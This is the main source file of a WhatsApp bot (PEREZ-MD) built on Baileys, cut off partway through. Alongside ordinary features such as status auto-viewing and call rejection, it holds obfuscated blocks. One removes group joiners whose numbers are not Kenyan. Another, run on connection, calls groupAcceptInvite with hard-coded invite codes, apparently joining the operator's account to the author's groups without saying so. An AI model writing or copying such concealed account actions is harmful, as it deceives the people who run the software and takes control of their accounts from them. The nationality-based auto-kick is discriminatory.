const sessionName = 'session';
const session = process.env.SESSION || '';
const antiforeign = process.env.ANTIFOREIGN || 'TRUE';
const autobio = process.env.AUTOBIO || 'TRUE';
const autolike = process.env.AUTOLIKE_STATUS || 'TRUE';
const anticall = process.env.AUTOREJECT_CALL || 'TRUE';
let botname = process.env.BOTNAME || '𝙋𝙀𝙍𝙀𝙕-𝙈𝘿';

const {
  default: perezConnect,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  downloadContentFromMessage,
  jidDecode,
  proto,
  getContentType,
         } = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const chalk = require("chalk");
const FileType = require("file-type");
const figlet = require("figlet");
let lastTextTime = 0;
const messageDelay = 5000;
const currentTime = Date.now();
const packname = process.env.STICKER_PACKNAME;
const _ = require("lodash");
const PhoneNumber = require("awesome-phonenumber");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/dreadexif'); 
const { isUrl, smsg, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/dreadfunc');
const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });

const autoviewstatus = process.env.AUTOVIEW_STATUS || 'TRUE';
const welcome = process.env.WELCOME || 'TRUE';

const color = (text, color) => {
  return !color ? chalk.green(text) : chalk.keyword(color)(text);
};

async function authenticationn() {
  try {
    if (!fs.existsSync("./session/creds.json")) {
      console.log('Connecting...');
      await fs.writeFileSync("./session/creds.json", atob(session), "utf8");
    } else if (session !== "zokk") {
      await fs.writeFileSync("./session/creds.json", atob(session), "utf8");
    }
  } catch (_0xf348d3) {
    console.log("Session is invalid: " + _0xf348d3);
    return;
  }
}

async function startperez() {
  await authenticationn();
  const { state, saveCreds } = await useMultiFileAuthState('session');
  const { version, isLatest } = await fetchLatestBaileysVersion();
  console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
  console.log(
    color(
      figlet.textSync("PEREZ-MD", {
        font: "Standard",
        horizontalLayout: "default",
        vertivalLayout: "default",
        whitespaceBreak: false,
      }),
      "green"
    )
  );

  const client = perezConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: ["PEREZ", "Safari", "5.1.7"],
    auth: state,
syncFullHistory: true,
  });

if (autobio === 'TRUE'){ 
            setInterval(() => { 

                                 const date = new Date() 

                         client.updateProfileStatus( 

                                         ` ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.` 

                                 ) 

                         }, 10 * 1000) 

}

  store.bind(client.ev);

  client.ev.on("messages.upsert", async (chatUpdate) => {
    //console.log(JSON.stringify(chatUpdate, undefined, 2))
    try {

      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;

      if (autoviewstatus === 'TRUE' && autolike === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {

const mokayas = await client.decodeJid(client.user.id);

await client.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '😳'}}, { statusJidList: [mek.key.participant, mokayas] });
      }
      
      if (autoviewstatus === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {

         client.readMessages([mek.key]);

}
   
      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      
      m = smsg(client, mek, store);
      
  const Perez = require("./𝙋𝙀𝙍𝙀𝙕-𝙈𝘿");
Perez(client, m, chatUpdate, store);

      } catch (err) {
    
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };


  client.ev.on('call', async (callData) => {
    if (anticall === 'TRUE') {
      const callId = callData[0].id;
      const callerId = callData[0].from;
      
      await client.rejectCall(callId, callerId);
      if (currentTime - lastTextTime >= messageDelay) {
        await client.sendMessage(callerId, {
          text: "Anticall is active, Only texts are allowed"
        });
        lastTextTime = currentTime;
      } else {
        console.log('To the next step!');
      }
    }
    });

function _0x29cf(){const _0x2f6ca3=['group-participants.update','remove','254','910863dDSaFb','146487zDznIw','groupParticipantsUpdate','sendMessage','200259gYsLZh','startsWith','40bMoLNF','13151ZUchWx','82691ApiyjL','4LeNAvk','add','\x20has\x20been\x20removed\x20by\x20Dreaded!\x20Only\x20Kenyan\x20numbers\x20are\x20allowed\x20to\x20join!','1055145aElrbj','participants','1500600oPVfCJ','20HUXDAq','48IAhWXe'];_0x29cf=function(){return _0x2f6ca3;};return _0x29cf();}const _0xe11567=_0x1275;function _0x1275(_0x28b765,_0x13dc1a){const _0x29cfbd=_0x29cf();return _0x1275=function(_0x12753e,_0x2117f6){_0x12753e=_0x12753e-0x145;let _0x51fa9b=_0x29cfbd[_0x12753e];return _0x51fa9b;},_0x1275(_0x28b765,_0x13dc1a);}(function(_0x7a02ed,_0xedb092){const _0x40a74e=_0x1275,_0x2c7c97=_0x7a02ed();while(!![]){try{const _0x2784d5=parseInt(_0x40a74e(0x147))/0x1*(-parseInt(_0x40a74e(0x14f))/0x2)+-parseInt(_0x40a74e(0x154))/0x3*(parseInt(_0x40a74e(0x149))/0x4)+parseInt(_0x40a74e(0x14c))/0x5+parseInt(_0x40a74e(0x14e))/0x6+parseInt(_0x40a74e(0x148))/0x7*(parseInt(_0x40a74e(0x150))/0x8)+-parseInt(_0x40a74e(0x158))/0x9*(-parseInt(_0x40a74e(0x146))/0xa)+-parseInt(_0x40a74e(0x155))/0xb;if(_0x2784d5===_0xedb092)break;else _0x2c7c97['push'](_0x2c7c97['shift']());}catch(_0x210b13){_0x2c7c97['push'](_0x2c7c97['shift']());}}}(_0x29cf,0x2a213),client['ev']['on'](_0xe11567(0x151),async _0x2b1bff=>{const _0x555408=_0xe11567;let _0x53289d=await await client['groupMetadata'](_0x2b1bff['id']),_0x3279a2=_0x2b1bff[_0x555408(0x14d)][0x0];_0x2b1bff['action']==_0x555408(0x14a)&&(!member[_0x555408(0x145)](_0x555408(0x153))&&(await client[_0x555408(0x156)](_0x2b1bff['id'],[_0x3279a2],_0x555408(0x152)),client[_0x555408(0x157)](_0x2b1bff['id'],{'text':'@'+_0x3279a2['split']`@`[0x0]+_0x555408(0x14b)})));}));
function _0x4f5a() {
    const _0x1d2cdd = [
        'VMeaW',
        'XCwNx',
        '60opHYUF',
        'ate',
        'includes',
        'zLvfv',
        '1384tgPBTu',
        'hodHI',
        'ription.\x20F',
        'DETECTED!\x20',
        'vactN',
        '1276550RAX',
        '16944hLhQEk',
        '\x20getting\x20r',
        'RRe',
        'uBhNg',
        'WuYZo',
        'PDXha',
        'SkgPg',
        'WECwI',
        'WwKiW',
        'promote',
        '11619LvfHk',
        'jdJUI',
        'scbPN',
        '1990254eux',
        'VDIqx',
        'BLQSQ',
        'ZTVdG',
        '6258850GJn',
        'OaVWm',
        'ESfoN',
        'KdtgL',
        'GBBAd',
        'AGfFh',
        'cbLUR',
        'VNrCi',
        'KoYti',
        '2541140180',
        'wKXuE',
        '246OGpYPS',
        'Sswhy',
        'ollow\x20the\x20',
        'TRUE',
        'oHCDg',
        '5soQhdy',
        '6240444bvPGYh',
        'group\x20desc',
        'icipants.u',
        'cipantsUpd',
        'fHsoE',
        'shift',
        '!\x20Promoted',
        'gWqAZ',
        '320HXkysB',
        'subject',
        '15VWbqBI',
        '\x20has\x20joine',
        'sendMessag',
        'pdate',
        'jsSJE',
        'ymbCJ',
        '9rOCBsS',
        '5528200DCrwWN',
        'group\x20rule',
        'PEREZ\x20BOT',
        'lry',
        'cBOYH',
        'ILuES',
        'groupParti',
        'ht\x20want\x20to',
        'POJWT',
        'YbrwE',
        '\x20group\x27s\x20i',
        'emoved.\x0a\x0a',
        'groupMetad',
        'group-part',
        'BXohV',
        '.\x0a\x0aYou\x20mig',
        'jTkhm',
        'Ctyhp',
        'add',
        'ata',
        '1911516biE',
        '382965uHzgwg',
        'VhVIL',
        'WmfXY',
        'jJXPL',
        '24933Cggbv',
        'bZJXt',
        'CwTnP',
        'tfbPo',
        'cKFRx',
        'aHkJO',
        'bvsZQ',
        'eFHkX',
        '\x20read\x20the\x20',
        'action',
        'dFjfA',
        'push',
        'Erpvc',
        '1805634vieSNN',
        'kZXtH',
        'DttQT',
        'qxw',
        'sKCMx',
        'WlXns',
        'tATwn',
        'GpWma',
        '!\x202025',
        'Knmng',
        'JWVsl',
        '\x20to\x20Admin!',
        '467517OoTx',
        'me\x20to\x20',
        '👀\x0a\x0aOwner\x20@',
        'XoVuk',
        'split',
        'd\x20via\x20this',
        's\x20to\x20avoid',
        'nvite\x20link',
        'WKk',
        'vhvuK',
        'PvJaf',
        'participan',
        '1858297nwRhIR',
        '16VXWudv',
        'DKNTN',
        'yvnDl',
        'DgeRP',
        '599384cfdkQy',
        '.\x20👋\x0a\x0aWelco'
    ];
    _0x4f5a = function () {
        return _0x1d2cdd;
    };
    return _0x4f5a();
}
const _0x2fbcd6 = _0x30c0;
function _0x30c0(_0x4dfa59, _0x56a568) {
    const _0x23c11e = _0x4f5a();
    return _0x30c0 = function (_0x5ed8e5, _0x2c66ef) {
        _0x5ed8e5 = _0x5ed8e5 - (0x1 * -0x13c7 + 0x867 + -0xb * -0x120);
        let _0x33b167 = _0x23c11e[_0x5ed8e5];
        return _0x33b167;
    }, _0x30c0(_0x4dfa59, _0x56a568);
}
(function (_0x35a62c, _0x70bcfe) {
    const _0x4c0f34 = _0x30c0, _0x3c5967 = _0x35a62c();
    while (!![]) {
        try {
            const _0x131896 = -parseInt(_0x4c0f34(0x16f)) / (0x22e4 + 0xdb7 * -0x1 + -0x152c) + parseInt(_0x4c0f34(0x17d)) / (0x1974 + 0x37f * 0x9 + 0x11 * -0x359) * (parseInt(_0x4c0f34(0x115)) / (-0x1d97 + 0x3 * -0x40b + 0x29bb)) + parseInt(_0x4c0f34(0x11b)) / (-0x1f1 + 0x3 * -0x2af + 0x356 * 0x3) + -parseInt(_0x4c0f34(0x125)) / (-0x2513 + -0x9 * 0xd5 + 0x2c95) * (parseInt(_0x4c0f34(0x152)) / (-0x161 + 0x6b * 0xf + -0x2 * 0x26f)) + parseInt(_0x4c0f34(0x16a)) / (-0x3 * 0x6be + -0xda3 * 0x1 + 0x21e4) * (-parseInt(_0x4c0f34(0x16b)) / (-0x1d7 * 0x4 + 0x1 * 0x1f51 + -0x17ed)) + -parseInt(_0x4c0f34(0x12b)) / (0x1f88 + 0x26f2 * -0x1 + 0x773 * 0x1) * (-parseInt(_0x4c0f34(0x12c)) / (-0x21e0 + 0x70f * -0x2 + 0x3008)) + -parseInt(_0x4c0f34(0x141)) / (-0x1c1d + 0x15cb * 0x1 + 0x65d) * (-parseInt(_0x4c0f34(0x173)) / (-0x2a * -0xba + 0x12f * 0x19 + -0x7b * 0x7d));
            if (_0x131896 === _0x70bcfe)
                break;
            else
                _0x3c5967['push'](_0x3c5967['shift']());
        } catch (_0x1adbdc) {
            _0x3c5967['push'](_0x3c5967['shift']());
        }
    }
}(_0x4f5a, 0x2bd * -0x41c + -0x85580 + -0x1 * -0x220f83));
function _0x52d5(_0x3976cc, _0x3646df) {
    const _0x4814a5 = _0x30c0, _0x512ac3 = {
            'cbLUR': function (_0x467bba, _0x33a9e9) {
                return _0x467bba - _0x33a9e9;
            },
            'GpWma': function (_0x1ab0d7) {
                return _0x1ab0d7();
            },
            'Knmng': function (_0x125ff1, _0x28224, _0x10b22d) {
                return _0x125ff1(_0x28224, _0x10b22d);
            }
        }, _0x8b2022 = _0x512ac3[_0x4814a5(0x159)](_0x2f66);
    return _0x52d5 = function (_0x5064fa, _0x33acb0) {
        const _0x55e8d7 = _0x4814a5;
        _0x5064fa = _0x512ac3[_0x55e8d7(0x110)](_0x5064fa, 0x2439 + -0x8e6 + -0x1bc * 0xf);
        let _0xfbded8 = _0x8b2022[_0x5064fa];
        return _0xfbded8;
    }, _0x512ac3[_0x4814a5(0x15b)](_0x52d5, _0x3976cc, _0x3646df);
}
(function (_0x17e561, _0x1ee97a) {
    const _0x3fea7e = _0x30c0, _0x3e4fe3 = {
            'XoVuk': function (_0x2336ee) {
                return _0x2336ee();
            },
            'jsSJE': function (_0x24fb7a, _0x402c33) {
                return _0x24fb7a + _0x402c33;
            },
            'WwKiW': function (_0x1ac21, _0x389bc2) {
                return _0x1ac21 + _0x389bc2;
            },
            'POJWT': function (_0x2e433e, _0x58a1a9) {
                return _0x2e433e + _0x58a1a9;
            },
            'kZXtH': function (_0x3c9f04, _0x20bcaf) {
                return _0x3c9f04 + _0x20bcaf;
            },
            'AGfFh': function (_0x14b964, _0x500c71) {
                return _0x14b964 / _0x500c71;
            },
            'ymbCJ': function (_0x6c848c, _0x2346d3) {
                return _0x6c848c(_0x2346d3);
            },
            'GBBAd': function (_0x51c894, _0xd345d3) {
                return _0x51c894(_0xd345d3);
            },
            'VDIqx': function (_0xef50ec, _0x11f978) {
                return _0xef50ec(_0x11f978);
            },
            'jJXPL': function (_0x40d6c6, _0x4a5d6e) {
                return _0x40d6c6 * _0x4a5d6e;
            },
            'YbrwE': function (_0x35b9df, _0x3aed51) {
                return _0x35b9df / _0x3aed51;
            },
            'JWVsl': function (_0x1e3700, _0x3438db) {
                return _0x1e3700 * _0x3438db;
            },
            'ILuES': function (_0x57b17d, _0x39d29c) {
                return _0x57b17d(_0x39d29c);
            },
            'yvnDl': function (_0x576548, _0x2839c0) {
                return _0x576548 / _0x2839c0;
            },
            'Sswhy': function (_0x59dd9d, _0x27085e) {
                return _0x59dd9d(_0x27085e);
            },
            'VhVIL': function (_0x27a1dc, _0x72b10d) {
                return _0x27a1dc / _0x72b10d;
            },
            'KoYti': function (_0x1e80d0, _0x42649c) {
                return _0x1e80d0(_0x42649c);
            },
            'XCwNx': function (_0x490941, _0x25697f) {
                return _0x490941 / _0x25697f;
            },
            'eFHkX': function (_0x42d2a5, _0x3da8f9) {
                return _0x42d2a5(_0x3da8f9);
            },
            'ZTVdG': function (_0x506a18, _0x545f6b) {
                return _0x506a18 === _0x545f6b;
            },
            'PDXha': _0x3fea7e(0x150),
            'jTkhm': _0x3fea7e(0x120)
        }, _0x173bbf = _0x52d5, _0xc54373 = _0x3e4fe3[_0x3fea7e(0x161)](_0x17e561);
    while (!![]) {
        try {
            const _0x278716 = _0x3e4fe3[_0x3fea7e(0x129)](_0x3e4fe3[_0x3fea7e(0x101)](_0x3e4fe3[_0x3fea7e(0x134)](_0x3e4fe3[_0x3fea7e(0x153)](_0x3e4fe3[_0x3fea7e(0x134)](_0x3e4fe3[_0x3fea7e(0x134)](_0x3e4fe3[_0x3fea7e(0x10f)](-_0x3e4fe3[_0x3fea7e(0x12a)](parseInt, _0x3e4fe3[_0x3fea7e(0x10e)](_0x173bbf, -0x7b + -0xb5d * 0x2 + -0xcb * -0x1f)), -0x1050 + -0x1f59 + 0x1 * 0x2faa), _0x3e4fe3[_0x3fea7e(0x10f)](_0x3e4fe3[_0x3fea7e(0x107)](parseInt, _0x3e4fe3[_0x3fea7e(0x10e)](_0x173bbf, -0x22c2 + -0x2106 + 0x451f)), 0x239d + 0x121 + -0x24bc)), _0x3e4fe3[_0x3fea7e(0x144)](_0x3e4fe3[_0x3fea7e(0x135)](-_0x3e4fe3[_0x3fea7e(0x12a)](parseInt, _0x3e4fe3[_0x3fea7e(0x12a)](_0x173bbf, -0x10c2 + 0x164b + -0x42b)), -0x1447 * -0x1 + 0x1 * -0x1255 + -0x1ef), _0x3e4fe3[_0x3fea7e(0x10f)](-_0x3e4fe3[_0x3fea7e(0x10e)](parseInt, _0x3e4fe3[_0x3fea7e(0x10e)](_0x173bbf, -0x2574 + 0x333 + -0x239e * -0x1)), -0x242f + 0x352 * 0xa + 0x2ff * 0x1))), _0x3e4fe3[_0x3fea7e(0x15c)](_0x3e4fe3[_0x3fea7e(0x135)](-_0x3e4fe3[_0x3fea7e(0x131)](parseInt, _0x3e4fe3[_0x3fea7e(0x107)](_0x173bbf, -0x12c2 + 0xd44 + -0x5 * -0x15d)), 0x1 * -0x628 + -0x7 * 0x77 + 0x1 * 0x96e), _0x3e4fe3[_0x3fea7e(0x16d)](-_0x3e4fe3[_0x3fea7e(0x131)](parseInt, _0x3e4fe3[_0x3fea7e(0x116)](_0x173bbf, 0x969 + -0x12b4 + -0x2a8 * -0x4)), -0x2b * -0x5f + 0x225e + -0x324d))), _0x3e4fe3[_0x3fea7e(0x142)](-_0x3e4fe3[_0x3fea7e(0x107)](parseInt, _0x3e4fe3[_0x3fea7e(0x10e)](_0x173bbf, -0x2b6 + 0x1da2 + -0x1994)), 0x1 * -0xb17 + -0x830 + -0x134e * -0x1)), _0x3e4fe3[_0x3fea7e(0x144)](_0x3e4fe3[_0x3fea7e(0x135)](_0x3e4fe3[_0x3fea7e(0x116)](parseInt, _0x3e4fe3[_0x3fea7e(0x10e)](_0x173bbf, -0x88e + -0xad + 0xa95 * 0x1)), 0xa7 * 0x39 + 0x280 + 0x1 * -0x27a7), _0x3e4fe3[_0x3fea7e(0x142)](_0x3e4fe3[_0x3fea7e(0x131)](parseInt, _0x3e4fe3[_0x3fea7e(0x112)](_0x173bbf, 0x43 * -0xf + 0xcf7 + -0x97 * 0xd)), 0x2317 + -0x1d * -0x106 + -0x40bc))), _0x3e4fe3[_0x3fea7e(0x172)](-_0x3e4fe3[_0x3fea7e(0x131)](parseInt, _0x3e4fe3[_0x3fea7e(0x14c)](_0x173bbf, 0x21ef + 0xda + 0x10 * -0x217)), -0x8 * 0xb6 + 0x22bb + -0xf * 0x1ef));
            if (_0x3e4fe3[_0x3fea7e(0x109)](_0x278716, _0x1ee97a))
                break;
            else
                _0xc54373[_0x3e4fe3[_0x3fea7e(0x182)]](_0xc54373[_0x3e4fe3[_0x3fea7e(0x13c)]]());
        } catch (_0x194d40) {
            _0xc54373[_0x3e4fe3[_0x3fea7e(0x182)]](_0xc54373[_0x3e4fe3[_0x3fea7e(0x13c)]]());
        }
    }
}(_0x2f66, -0x93522 + 0x7770 + 0xfdf52), client['ev']['on'](_0x2fbcd6(0x139) + _0x2fbcd6(0x11d) + _0x2fbcd6(0x128), async _0x506717 => {
    const _0x5d1d4c = _0x2fbcd6, _0xe202cf = {
            'bZJXt': function (_0x1e1c42, _0x98107d) {
                return _0x1e1c42(_0x98107d);
            },
            'WECwI': _0x5d1d4c(0x169) + 'ts',
            'DttQT': function (_0x866971, _0x189aa8) {
                return _0x866971 == _0x189aa8;
            },
            'jdJUI': function (_0x224420, _0x2ddee7) {
                return _0x224420(_0x2ddee7);
            },
            'uBhNg': function (_0x53529c, _0x3f3b5a) {
                return _0x53529c(_0x3f3b5a);
            },
            'OaVWm': _0x5d1d4c(0x175),
            'WmfXY': function (_0x1c39cb, _0x3f2650) {
                return _0x1c39cb(_0x3f2650);
            },
            'Ctyhp': _0x5d1d4c(0x132) + _0x5d1d4c(0x11e) + _0x5d1d4c(0x174),
            'VMeaW': function (_0x1ba515, _0x53ea7d) {
                return _0x1ba515 + _0x53ea7d;
            },
            'VNrCi': function (_0x418751, _0x4f4580) {
                return _0x418751(_0x4f4580);
            },
            'vactN': function (_0x4e4b82, _0x4d359e) {
                return _0x4e4b82(_0x4d359e);
            },
            'cBOYH': function (_0x5d7aca, _0x17f822) {
                return _0x5d7aca === _0x17f822;
            },
            'hodHI': _0x5d1d4c(0x118),
            'vhvuK': function (_0x4d6bd1, _0x1c1dfa) {
                return _0x4d6bd1 + _0x1c1dfa;
            },
            'tATwn': function (_0x37f527, _0xe02781) {
                return _0x37f527(_0xe02781);
            },
            'cKFRx': function (_0x5831f5, _0xc4f669) {
                return _0x5831f5(_0xc4f669);
            }
        }, _0x4d080c = _0x52d5;
    let _0x5f2721 = await client[_0xe202cf[_0x5d1d4c(0x146)](_0x4d080c, 0x17f7 + 0x1 * -0x1007 + 0x79 * -0xe)](_0x506717['id']), _0x59ed2d = _0x506717[_0xe202cf[_0x5d1d4c(0x100)]];
    for (let _0x2f97ae of _0x59ed2d) {
        if (_0xe202cf[_0x5d1d4c(0x154)](_0x506717[_0xe202cf[_0x5d1d4c(0x104)](_0x4d080c, 0x5 * -0xac + 0x1a7e + -0x15d3)], _0xe202cf[_0x5d1d4c(0x180)](_0x4d080c, 0x15b + 0x2152 + -0x215c))) {
            if (_0x2f97ae[_0xe202cf[_0x5d1d4c(0x10b)]](_0xe202cf[_0x5d1d4c(0x143)](_0x4d080c, -0x674 + 0x4 * -0x5f0 + 0x1f8a)))
                await client[_0xe202cf[_0x5d1d4c(0x13d)]](_0x506717['id'], [_0x2f97ae], _0xe202cf[_0x5d1d4c(0x146)](_0x4d080c, -0x114e + 0x8ce + -0x6e * -0x17)), client[_0xe202cf[_0x5d1d4c(0x146)](_0x4d080c, 0x1 * 0xbaf + -0x1 * -0xa5e + -0x14aa)](_0x506717['id'], {
                    'text': _0xe202cf[_0x5d1d4c(0x171)](_0xe202cf[_0x5d1d4c(0x171)](_0xe202cf[_0x5d1d4c(0x111)](_0x4d080c, -0x1b * -0x111 + 0x1a54 + -0x35c3), _0x2f97ae[_0xe202cf[_0x5d1d4c(0x17b)](_0x4d080c, -0x1 * -0xfc6 + 0x180 + -0x7f1 * 0x2)]`@`[-0x1dbb + -0xa6 * 0xb + 0x1 * 0x24dd]), _0xe202cf[_0x5d1d4c(0x146)](_0x4d080c, 0x2 * 0xe3c + -0x5 * -0x7ad + -0x13 * 0x373)),
                    'mentions': [_0x2f97ae]
                });
            else
                _0xe202cf[_0x5d1d4c(0x130)](welcome, _0xe202cf[_0x5d1d4c(0x178)]) && _0x2f97ae && await client[_0xe202cf[_0x5d1d4c(0x143)](_0x4d080c, -0x1aa3 + -0x666 * 0x1 + -0x1136 * -0x2)](_0x506717['id'], {
                    'text': _0xe202cf[_0x5d1d4c(0x171)](_0xe202cf[_0x5d1d4c(0x167)](_0xe202cf[_0x5d1d4c(0x167)](_0xe202cf[_0x5d1d4c(0x171)]('@', _0x2f97ae[_0xe202cf[_0x5d1d4c(0x158)](_0x4d080c, 0x1287 + 0x147c + -0x259f * 0x1)]('@')[0x1c * 0x32 + -0x423 * -0x2 + -0x2 * 0x6df]), _0xe202cf[_0x5d1d4c(0x111)](_0x4d080c, 0x1 * -0x204d + 0xdf7 + -0x13b7 * -0x1)), _0x5f2721[_0xe202cf[_0x5d1d4c(0x180)](_0x4d080c, -0x56a + 0x11c1 + -0xb03)]), _0xe202cf[_0x5d1d4c(0x149)](_0x4d080c, -0x2 * -0xd13 + -0x1ecc + 0x601)),
                    'mentions': [_0x2f97ae]
                });
        }
    }
}));
function _0x2f66() {
    const _0x5484c3 = _0x2fbcd6, _0x2ab0fc = {
            'zLvfv': _0x5484c3(0x102),
            'scbPN': _0x5484c3(0x127) + 'e',
            'tfbPo': _0x5484c3(0x162),
            'bvsZQ': _0x5484c3(0x14e),
            'CwTnP': _0x5484c3(0x126) + _0x5484c3(0x163) + _0x5484c3(0x136) + _0x5484c3(0x165) + _0x5484c3(0x121) + _0x5484c3(0x15d),
            'oHCDg': _0x5484c3(0x13e),
            'DKNTN': _0x5484c3(0x138) + _0x5484c3(0x13f),
            'aHkJO': _0x5484c3(0x11a),
            'KdtgL': _0x5484c3(0x124),
            'wKXuE': _0x5484c3(0x140) + _0x5484c3(0x155),
            'BLQSQ': _0x5484c3(0x113) + '35',
            'SkgPg': _0x5484c3(0x17c) + _0x5484c3(0x12f),
            'Erpvc': _0x5484c3(0x106) + _0x5484c3(0x17f),
            'dFjfA': _0x5484c3(0x10a) + _0x5484c3(0x166),
            'DgeRP': _0x5484c3(0x177),
            'fHsoE': _0x5484c3(0x13b) + _0x5484c3(0x133) + _0x5484c3(0x14d) + _0x5484c3(0x11c) + _0x5484c3(0x179) + _0x5484c3(0x117) + _0x5484c3(0x12d) + _0x5484c3(0x164) + _0x5484c3(0x17e) + _0x5484c3(0x137) + _0x5484c3(0x12e) + _0x5484c3(0x15a),
            'PvJaf': _0x5484c3(0x17a) + _0x5484c3(0x160),
            'sKCMx': _0x5484c3(0x123),
            'gWqAZ': _0x5484c3(0x145) + 'x',
            'WlXns': _0x5484c3(0x103) + 'C',
            'ESfoN': _0x5484c3(0x15e) + 'Co',
            'BXohV': _0x5484c3(0x170) + _0x5484c3(0x15f),
            'WuYZo': function (_0x2f7ff6) {
                return _0x2f7ff6();
            }
        }, _0x3a3737 = [
            _0x2ab0fc[_0x5484c3(0x176)],
            _0x2ab0fc[_0x5484c3(0x105)],
            _0x2ab0fc[_0x5484c3(0x148)],
            _0x2ab0fc[_0x5484c3(0x14b)],
            _0x2ab0fc[_0x5484c3(0x147)],
            _0x2ab0fc[_0x5484c3(0x119)],
            _0x2ab0fc[_0x5484c3(0x16c)],
            _0x2ab0fc[_0x5484c3(0x14a)],
            _0x2ab0fc[_0x5484c3(0x10d)],
            _0x2ab0fc[_0x5484c3(0x114)],
            _0x2ab0fc[_0x5484c3(0x108)],
            _0x2ab0fc[_0x5484c3(0x183)],
            _0x2ab0fc[_0x5484c3(0x151)],
            _0x2ab0fc[_0x5484c3(0x14f)],
            _0x2ab0fc[_0x5484c3(0x16e)],
            _0x2ab0fc[_0x5484c3(0x11f)],
            _0x2ab0fc[_0x5484c3(0x168)],
            _0x2ab0fc[_0x5484c3(0x156)],
            _0x2ab0fc[_0x5484c3(0x122)],
            _0x2ab0fc[_0x5484c3(0x157)],
            _0x2ab0fc[_0x5484c3(0x10c)],
            _0x2ab0fc[_0x5484c3(0x13a)]
        ];
    return _0x2f66 = function () {
        return _0x3a3737;
    }, _0x2ab0fc[_0x5484c3(0x181)](_0x2f66);
}
  client.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = client.decodeJid(contact.id);
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });

  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === client.decodeJid(client.user.id)
          ? client.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.setStatus = (status) => {
    client.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  client.public = true;

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startperez();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startperez();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete File creds.json and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startperez();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startperez();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startperez();
      }
    } else if (connection === "open") {  
      function _0xcc14(_0x113c46,_0x24f26a){var _0x4c0bfe=_0x4c0b();return _0xcc14=function(_0xcc14fe,_0x4ef093){_0xcc14fe=_0xcc14fe-0x1f2;var _0x5d7443=_0x4c0bfe[_0xcc14fe];return _0x5d7443;},_0xcc14(_0x113c46,_0x24f26a);}function _0x4c0b(){var _0x1407cc=['2275pXseMA','6856317xHdDPV','DefN96lXQ4i5iO1wDDeu2C','219769PQbVwp','5149YGIQHm','groupAcceptInvite','Gbv4AhXFJ7h43SQq4eJQeC','34323492DsxiwA','6lKgbtl','1484316bIAOVW','580jiMBNK','148LELKab','16lMtIBe','8507177UkOVKH','4100YKAAvN'];_0x4c0b=function(){return _0x1407cc;};return _0x4c0b();}var _0x32017d=_0xcc14;(function(_0x4a60ce,_0x79a74a){var _0x254296=_0xcc14,_0x4563b6=_0x4a60ce();while(!![]){try{var 